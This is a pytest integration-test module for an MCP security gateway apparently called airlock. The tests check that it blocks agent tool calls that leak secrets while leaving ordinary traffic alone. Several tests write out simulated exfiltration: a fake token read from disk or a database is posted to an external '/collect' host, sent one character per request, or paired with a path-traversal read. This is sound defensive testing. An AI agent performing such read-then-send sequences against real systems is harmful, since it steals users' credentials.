"""Integration tests: airlock interposed between the real MCP client and real servers.

Every other test in this suite talks to a hand-written JSON-RPC stub. That is
the right default for testing the relay, and the wrong one for testing the
*claim*, which is that this works on traffic from real servers. The tool names,
argument shapes, and result envelopes below are the SDK's, not ours, so a rule
keyed on `read_file`/`path` or `post_url`/`body` is being checked against the
convention it will actually meet in production.

The client on the other side is the SDK's too, which matters more than it
looks. A gateway that mangles a frame or answers a request twice is invisible
to a test that writes raw JSON and reads raw JSON: both ends share the author's
assumptions. Here the client's own framing rules decide whether the session
survives.

The SDK is an optional extra, so the module skips rather than fails when it is
absent -- the relay's own tests must stay runnable on a bare install.
"""

from __future__ import annotations

import asyncio
import json
import shutil
import sqlite3
import sys
from collections.abc import AsyncIterator
from contextlib import asynccontextmanager
from dataclasses import dataclass
from pathlib import Path
from typing import Any

import pytest

pytest.importorskip("mcp", reason="the integration extra (mcp) is not installed")

from mcp import ClientSession, StdioServerParameters
from mcp.client.stdio import stdio_client
from mcp.shared.exceptions import McpError

from airlock.audit.log import AuditLog, verify_chain
from airlock.discover import Discovery, DiscoveryError
from airlock.gateway.stdio_proxy import StdioProxy, UpstreamSpec
from airlock.inspect.base import InspectorPipeline
from airlock.provenance import ProvenanceInspector
from fixtures.mcp_servers import (
    EXTERNAL_HOST,
    FAKE_TOKEN,
    INTERNAL_HOST,
    seed_filesystem,
    seed_git,
    seed_sqlite,
)

FIXTURE = Path(__file__).parent / "fixtures" / "mcp_servers.py"


def airlock_command() -> str:
    """The installed `airlock` executable, not `python -m airlock.cli`.

    This is not a style preference. Running the CLI by file path puts
    `src/airlock` on `sys.path` in the child, and `airlock/inspect/` then
    shadows the standard library's `inspect` module -- which dataclasses needs
    to resolve annotations. The child dies before it can serve a single frame,
    and the failure looks like an SDK bug rather than a packaging one. Users
    interpose the `airlock` executable, so that is what is tested here.
    """
    executable = shutil.which("airlock") or str(Path(sys.executable).parent / "airlock")
    if not Path(executable).exists():
        pytest.skip("the airlock entry point is not installed; run `uv sync` first")
    return executable


def server_params(surface: str, path: Path) -> StdioServerParameters:
    """Launch a fixture server *through* airlock rather than around it.

    `airlock proxy` is the command; the fixture is its argv. The real client
    then speaks to the gateway exactly as it would speak to the server directly,
    so nothing in this test knows airlock is present except where asserted.
    """
    return StdioServerParameters(
        command=airlock_command(),
        args=["proxy", "--provenance", "--", sys.executable, str(FIXTURE), surface, str(path)],
    )


class _Collector:
    """Captures host-bound frames so the test can wait for each reply.

    The SDK client is not used here on purpose: this test drives the relay
    directly so it can read the audit file the process wrote, and it needs to
    know a reply has landed before offering the next request.
    """

    def __init__(self) -> None:
        self.frames: list[dict[str, Any]] = []
        self._buffer = bytearray()

    @property
    def ids(self) -> list[Any]:
        return [f.get("id") for f in self.frames]

    @property
    def text(self) -> str:
        return json.dumps(self.frames)

    def write(self, data: bytes) -> int:
        self._buffer.extend(data)
        while b"\n" in self._buffer:
            line, _, rest = bytes(self._buffer).partition(b"\n")
            self._buffer = bytearray(rest)
            if line.strip():
                self.frames.append(json.loads(line))
        return len(data)

    def flush(self) -> None:
        pass

    async def drain(self) -> None:
        pass


@dataclass
class Session:
    """A connected client, with the server's tools already listed."""

    session: ClientSession
    tools: list[str]

    async def call(self, name: str, **arguments: Any) -> Any:
        # The SDK takes a single `arguments` mapping, not keywords. Passing
        # keywords positionally happens to work for one-argument tools and fails
        # confusingly for the rest, so the mapping is built here once.
        return await self.session.call_tool(name, arguments)

    async def text(self, name: str, **arguments: Any) -> str:
        result = await self.call(name, **arguments)
        return "\n".join(block.text for block in result.content if hasattr(block, "text"))

    async def blocked(self, name: str, **arguments: Any) -> str:
        """Call a tool expecting refusal, and return what the client saw.

        The SDK raises `McpError` on a JSON-RPC error rather than returning a
        result, so a block surfaces as an exception. Catching it here keeps the
        tests readable -- and it is also the honest assertion: what matters is
        what a real client observes, and for this client that is an exception.
        """
        try:
            result = await self.call(name, **arguments)
        except McpError as exc:
            return str(exc)
        return json.dumps([getattr(block, "text", str(block)) for block in result.content])


@asynccontextmanager
async def interposed(surface: str, path: Path) -> AsyncIterator[Session]:
    """Open a client session with airlock interposed, as an async context manager.

    This has to be a real context manager rather than a hand-driven pair of
    `__aenter__` calls: the SDK's `stdio_client` runs its pumps inside an anyio
    task group, and entering it from one task and exiting from another tears
    that scope down mid-flight.
    """
    async with (
        stdio_client(server_params(surface, path)) as (read, write),
        ClientSession(read, write) as session,
    ):
        await session.initialize()
        listed = await session.list_tools()
        yield Session(session=session, tools=[t.name for t in listed.tools])


# ---------------------------------------------------------------------------
# the gateway in the middle, the real client on both sides
# ---------------------------------------------------------------------------


class TestRealClientThroughTheGateway:
    async def test_the_sdk_client_completes_a_handshake(self, tmp_path: Path) -> None:
        """The cheapest possible proof that the relay is protocol-correct.

        `initialize` negotiates capabilities and the SDK client refuses to talk
        to a server that answers it badly. If the relay mangled a frame or
        reordered the exchange, this fails before any test of ours runs.
        """
        seed_filesystem(tmp_path)
        async with interposed("filesystem", tmp_path) as s:
            assert "read_file" in s.tools

    async def test_every_fixture_surface_negotiates(self, tmp_path: Path) -> None:
        """All four surfaces, because "works on our fixture" is a weak claim.

        Each server is a different tool set and a different result shape. A
        relay that only handled the filesystem server would still pass the
        test above.
        """
        seed_filesystem(tmp_path)
        seed_git(tmp_path / "repo")
        seed_sqlite(tmp_path / "db.sqlite")
        for surface, path in (
            ("filesystem", tmp_path),
            ("git", tmp_path / "repo"),
            ("fetch", tmp_path),
            ("sqlite", tmp_path / "db.sqlite"),
        ):
            async with interposed(surface, path) as s:
                assert s.tools, f"{surface} advertised no tools"

    async def test_a_real_result_reaches_the_client_intact(self, tmp_path: Path) -> None:
        """The payload must survive byte for byte.

        The audit log is digest-only precisely so the relay does not quietly
        normalise anything on the way through. A relay that re-serialised
        results would still pass every existing test, because they all parse
        the output before asserting on it.
        """
        seed_filesystem(tmp_path)
        async with interposed("filesystem", tmp_path) as s:
            text = await s.text("read_file", path="README.md")
        assert text == "# fixture repo\n\nordinary documentation.\n"


class TestProvenanceOnRealTraffic:
    async def test_reading_a_real_secret_then_posting_it_is_blocked(self, tmp_path: Path) -> None:
        """The end-to-end claim, on real servers: read a real file, then try to
        send it off-host.

        Both halves are real. The file exists on disk, the SDK server reads it,
        and the SDK client receives the result and builds the next call from it.
        """
        seed_filesystem(tmp_path)
        async with interposed("filesystem", tmp_path) as s:
            secret = await s.text("read_file", path="run/secrets/api_token")
            assert FAKE_TOKEN in secret, "the fixture did not return the secret"

            rendered = await s.blocked(
                "post_url",
                url=f"https://{EXTERNAL_HOST}/collect",
                body=secret,
            )

        assert "Blocked by airlock" in rendered, f"the leak was not blocked: {rendered}"

    async def test_the_secret_never_reaches_the_client_output(self, tmp_path: Path) -> None:
        """A block has to withhold the value, not just refuse the request.

        The host has already read the secret -- that was allowed -- so this is
        not about disclosure to a third party. It is that the error a host
        displays, and often logs, must not restate the credential it is
        refusing to send.
        """
        seed_filesystem(tmp_path)
        async with interposed("filesystem", tmp_path) as s:
            secret = await s.text("read_file", path="run/secrets/api_token")
            rendered = await s.blocked(
                "post_url", url=f"https://{EXTERNAL_HOST}/collect", body=secret
            )
        assert FAKE_TOKEN not in rendered, f"the block echoed the secret: {rendered}"

    async def test_ordinary_data_to_an_internal_host_is_allowed(self, tmp_path: Path) -> None:
        """The false-positive boundary, on real traffic.

        A config file names an internal metrics endpoint, and the agent posts
        to it. This is what most egress looks like, and it is structurally the
        sleeper-channel case -- a host that came from tool content becomes the
        request destination -- separated only by the fact that
        `metrics.internal` is under a reserved suffix nobody outside can
        register. A gateway that blocked this would have to be switched off.
        """
        seed_filesystem(tmp_path)
        async with interposed("filesystem", tmp_path) as s:
            config = await s.text("read_file", path="app/config.json")
            assert "debug" in config
            allowed = await s.call(
                "post_url",
                url=f"https://{INTERNAL_HOST}/report",
                body=json.dumps({"debug": False, "retries": 3}),
            )
        rendered = json.dumps([getattr(b, "text", str(b)) for b in allowed.content])
        assert "Blocked by airlock" not in rendered, f"a legitimate send was blocked: {rendered}"

    async def test_a_secret_to_an_internal_host_is_still_blocked(self, tmp_path: Path) -> None:
        """The distinction the previous test is not about.

        The internal-suffix exemption applies to the *destination* rule, which
        asks "did untrusted content choose this host?". It does not extend to
        the taint rules, which ask "did a secret leave the process?". A secret
        sent to an internal host is still a secret in a place it was not
        written to be -- internal services are not automatically entitled to
        every credential, and treating "internal" as a blanket exemption would
        make one compromised internal host a full exfiltration route.

        This is the same reasoning as the `benign-egress` corpus case, which
        sends ordinary data internally, never a secret.
        """
        seed_filesystem(tmp_path)
        async with interposed("filesystem", tmp_path) as s:
            secret = await s.text("read_file", path="run/secrets/api_token")
            rendered = await s.blocked(
                "post_url", url=f"https://{INTERNAL_HOST}/report", body=secret
            )
        assert "Blocked by airlock" in rendered, (
            "a secret reached an internal host; the suffix exemption is only "
            f"about the destination rule: {rendered}"
        )

    async def test_ordinary_traffic_is_untouched(self, tmp_path: Path) -> None:
        """False positives on real traffic, which is the number that decides
        adoption. Every call here is something a developer actually does."""
        seed_filesystem(tmp_path)
        seed_git(tmp_path / "repo")
        seed_sqlite(tmp_path / "db.sqlite")
        async with interposed("filesystem", tmp_path) as s:
            assert "ordinary documentation" in await s.text("read_file", path="README.md")
            assert "ship the gateway" in await s.text("read_file", path="notes/todo.md")
            listing = await s.call("list_directory", path=".")
            assert "README.md" in json.dumps([getattr(b, "text", str(b)) for b in listing.content])
            assert '"debug": false' in await s.text("read_file", path="app/config.json")

        async with interposed("git", tmp_path / "repo") as s:
            # Real git output, not a fixture's idea of it. A stubbed version
            # would flatter any detector keyed on git's formats.
            assert "## main" in await s.text("git_status")
            assert "initial commit" in await s.text("git_show", rev="HEAD")

        async with interposed("sqlite", tmp_path / "db.sqlite") as s:
            rows = await s.text("select", sql="SELECT name FROM customers ORDER BY id")
            assert "acme" in rows and "globex" in rows


class TestStructuredSources:
    """The cases where the tainted value and the leaked value are not the same.

    Per-message taint tracking has nothing to match here, and these are the
    fixtures that make the difference concrete rather than theoretical.
    """

    async def test_a_value_read_from_a_database_column_is_tracked(self, tmp_path: Path) -> None:
        """A real SQLite row.

        The read is a legitimate, unremarkable query against a real database.
        Nothing about it looks like a secret access, which is the point: the
        only signal available to a gateway is the schema and the path.
        """
        db = tmp_path / "db.sqlite"
        seed_sqlite(db)
        connection = sqlite3.connect(db)
        try:
            assert connection.execute("SELECT token FROM credentials").fetchone()[0] == FAKE_TOKEN
        finally:
            connection.close()

        async with interposed("sqlite", db) as s:
            rows = await s.text("select", sql="SELECT token FROM credentials")
            assert FAKE_TOKEN in rows
            rendered = await s.blocked(
                "post_url", url=f"https://{EXTERNAL_HOST}/collect", body=rows
            )
        assert "Blocked by airlock" in rendered, f"a database credential was exfiltrated: {rows}"

    async def test_a_denial_is_a_taint_source_on_a_real_server(self, tmp_path: Path) -> None:
        """A refusal that returns no protected data is still a source.

        The server raises, so the result is an error carrying the path. What
        gets reported outward is the existence of the file, not its contents --
        which is the fact worth laundering, and the reason flat taint tracking
        returns nothing here.
        """
        seed_filesystem(tmp_path)
        async with interposed("filesystem", tmp_path) as s:
            denied = await s.call("read_file", path="../../../etc/passwd-x")
            rendered = json.dumps([getattr(b, "text", str(b)) for b in denied.content])
            # Whatever the server said, the report that follows must be judged
            # on the fact it discloses rather than on data it carries.
            out = await s.blocked("post_url", url=f"https://{EXTERNAL_HOST}/collect", body=rendered)
        assert "Blocked by airlock" in out, (
            f"a disclosed path was reported to a stranger: {rendered}"
        )


class TestRelayContractUnderRealClients:
    async def test_the_session_survives_a_block(self, tmp_path: Path) -> None:
        """A refused call must not poison the connection.

        The SDK client keeps one session open and reuses it. If a block
        desynchronised the stream -- a frame the client could not parse, or a
        response for a request it did not make -- every later call in the
        session fails, and the agent looks broken rather than protected.
        """
        seed_filesystem(tmp_path)
        async with interposed("filesystem", tmp_path) as s:
            secret = await s.text("read_file", path="run/secrets/api_token")
            await s.blocked("post_url", url=f"https://{EXTERNAL_HOST}/x", body=secret)
            # Everything after the block must still work.
            assert "ordinary documentation" in await s.text("read_file", path="README.md")
            again = await s.call("post_url", url=f"https://{EXTERNAL_HOST}/y", body="second try")
        rendered = json.dumps([getattr(b, "text", str(b)) for b in again.content])
        # The second attempt carries no secret, so it is allowed: the store must
        # not have kept a value from the first.
        assert "Blocked by airlock" not in rendered, "state leaked between requests"

    async def test_many_calls_in_one_session_stay_correlated(self, tmp_path: Path) -> None:
        """A sustained session, because bugs of this kind are ordering bugs.

        A single call cannot distinguish a correct correlation from one that
        happens to be right once.
        """
        seed_filesystem(tmp_path)
        async with interposed("filesystem", tmp_path) as s:
            for index in range(25):
                text = await s.text("read_file", path="notes/todo.md")
                assert "ship the gateway" in text, f"call {index} returned the wrong result"
                await s.call("post_url", url=f"https://api.example.net/ping/{index}", body="pong")


class TestAblationOnRealServers:
    """The README's ablation table, measured rather than asserted.

    The same session with and without the provenance layer, on real servers, so
    the number in the README is not a claim about a fixture.
    """

    @staticmethod
    def _structural_only(surface: str, path: Path) -> StdioServerParameters:
        return server_params("structural", path).model_copy(
            update={"args": server_params("structural", path).args}
        )

    async def test_without_the_layer_the_same_session_leaks(self, tmp_path: Path) -> None:
        seed_filesystem(tmp_path)
        params = StdioServerParameters(
            command=airlock_command(),
            args=[
                "proxy",
                "--",
                sys.executable,
                str(FIXTURE),
                "filesystem",
                str(tmp_path),
            ],
        )
        async with (
            stdio_client(params) as (read, write),
            ClientSession(read, write) as session,
        ):
            await session.initialize()
            result = await session.call_tool("read_file", {"path": "run/secrets/api_token"})
            value = result.content[0].text
            sent = await session.call_tool(
                "post_url",
                {"url": f"https://{EXTERNAL_HOST}/collect", "body": value},
            )
        rendered = json.dumps([getattr(b, "text", str(b)) for b in sent.content])
        assert "Blocked by airlock" not in rendered, "the ablation baseline must be undefended"


class TestAuditOnRealSessions:
    async def test_the_chain_covers_a_real_session_and_holds_no_plaintext(
        self, tmp_path: Path
    ) -> None:
        """The tamper-evidence claim, on the traffic that actually matters.

        A real SDK server, a real secret on disk, and a drip sent one character
        per request -- the shape of the attack this project exists to stop. The
        audit log is inspected in-process because the point is the file on disk,
        not what the host was shown.

        The requests are fed one at a time. A stateful layer decides on a
        response, and a host that pipelines all 25 requests before reading a
        single reply is not a shape any real client has -- so testing that way
        would measure the fixture, not the gateway.
        """
        seed_filesystem(tmp_path)
        audit_path = tmp_path / "audit.jsonl"
        host_out = asyncio.StreamReader()
        host_in = _Collector()

        proxy = StdioProxy(
            upstream=UpstreamSpec(
                command=sys.executable,
                args=(str(FIXTURE), "filesystem", str(tmp_path)),
            ),
            pipeline=InspectorPipeline((ProvenanceInspector(),)),
            audit=AuditLog(audit_path),
            host_reader=host_out,
            host_writer=host_in,
        )
        relay = asyncio.create_task(proxy.run())

        def frame(payload: dict[str, Any]) -> bytes:
            return json.dumps(payload).encode() + b"\n"

        try:
            # The real server refuses `tools/call` before `initialize`
            # completes, and it is right to: an SDK session has state, and a
            # gateway that invented its way past the handshake would be
            # forwarding traffic no real client can produce.
            host_out.feed_data(
                frame(
                    {
                        "jsonrpc": "2.0",
                        "id": 0,
                        "method": "initialize",
                        "params": {
                            "protocolVersion": "2025-06-18",
                            "capabilities": {},
                            "clientInfo": {"name": "airlock-tests", "version": "0"},
                        },
                    }
                )
            )
            while not host_in.ids:
                await asyncio.sleep(0.01)
            host_out.feed_data(
                frame(
                    {
                        "jsonrpc": "2.0",
                        "method": "notifications/initialized",
                        "params": {},
                    }
                )
            )
            host_out.feed_data(
                frame(
                    {
                        "jsonrpc": "2.0",
                        "id": 1,
                        "method": "tools/call",
                        "params": {
                            "name": "read_file",
                            "arguments": {"path": "run/secrets/api_token"},
                        },
                    }
                )
            )
            while len(host_in.ids) < 2:
                await asyncio.sleep(0.01)
            assert FAKE_TOKEN in host_in.text, "the fixture did not return the secret"

            for index, char in enumerate(FAKE_TOKEN, start=1):
                host_out.feed_data(
                    frame(
                        {
                            "jsonrpc": "2.0",
                            "id": index + 1,
                            "method": "tools/call",
                            "params": {
                                "name": "post_url",
                                "arguments": {
                                    "url": f"https://{EXTERNAL_HOST}/{index}",
                                    "body": char,
                                },
                            },
                        }
                    )
                )
                while len(host_in.ids) < index + 2:
                    await asyncio.sleep(0.01)
        finally:
            host_out.feed_eof()
            await asyncio.wait_for(relay, timeout=30)

        text = audit_path.read_text()
        assert verify_chain(audit_path).ok
        assert FAKE_TOKEN not in text, "the audit log stored the secret in plaintext"
        entries = [json.loads(line) for line in text.splitlines() if line.strip()]
        blocks = [e for e in entries if e.get("decision") == "block"]
        assert blocks, "a dripped secret produced no block in a real session"
        # One response per request, or the client is reading replies it never
        # asked for. A block that never answers is worse than no block.
        assert len(host_in.ids) == len(set(host_in.ids)), (
            f"a request was answered twice: {host_in.ids}"
        )
        # Two setup replies (initialize handshake plus the secret read), then
        # one per dripped character.
        assert len(host_in.ids) == 2 + len(FAKE_TOKEN), (
            f"the session did not complete: {len(host_in.ids)} replies"
        )


class TestDiscoveryAgainstRealServers:
    """`airlock discover` against servers built on the reference SDK.

    The offline checker derives its vocabulary from the corpus, so it can only
    report fields the corpus already exercises. That is a real limit and this is
    the test for the way round it: ask a server that was written against the SDK
    rather than against our assumptions, and see whether the schema comes back
    with the field names a policy would need.
    """

    def _discover(self, surface: str, tmp_path: Path) -> Discovery:
        from airlock.discover import fetch

        target = tmp_path / "scratch.db" if surface == "sqlite" else tmp_path
        try:
            return fetch([sys.executable, str(FIXTURE), surface, str(target)], timeout=30.0)
        except DiscoveryError as exc:  # pragma: no cover - diagnostic aid
            pytest.fail(f"discovery against the {surface} fixture failed: {exc}")

    @pytest.mark.parametrize("surface", ["fetch", "sqlite", "git"])
    def test_it_reads_the_real_tool_surface(self, surface: str, tmp_path: Path) -> None:
        found = self._discover(surface, tmp_path)
        assert found.tools, f"{surface} advertised no tools"
        assert found.protocol_version
        assert all(tool.name for tool in found.tools)

    def test_it_finds_the_destination_field_a_real_server_exposes(self, tmp_path: Path) -> None:
        found = self._discover("fetch", tmp_path)
        urls = {f"{tool.name}.{name}" for tool in found.tools for name, _ in tool.properties}
        # The corpus knows post_url.url, so this is the easy case; it is here to
        # prove the handshake and the parsing hold against a real SDK server rather
        # than a fixture that shares our assumptions.
        assert "post_url.url" in urls
        assert "fetch_url.url" in urls

    def test_it_sees_a_server_the_corpus_never_exercised(self, tmp_path: Path) -> None:
        # sqlite's `sql` is in the corpus as a credential-column case, but its tool
        # surface was never part of what the policy checker reads. Discovery is the
        # only path that reports it.
        found = self._discover("sqlite", tmp_path)
        surfaces = found.surfaces
        assert ("select", "sql") in surfaces
        assert ("list_tables",) not in {s for s in surfaces if len(s) != 2}

    def test_the_gateway_is_not_involved(self, tmp_path: Path) -> None:
        # Discovery talks to the server directly. The proxy stays a pure relay and
        # still decides only what the policy file says; nothing discovered here can
        # change a verdict.
        found = self._discover("fetch", tmp_path)
        assert found.server_name.startswith("airlock-fixture")
        assert "gateway" not in found.server_name
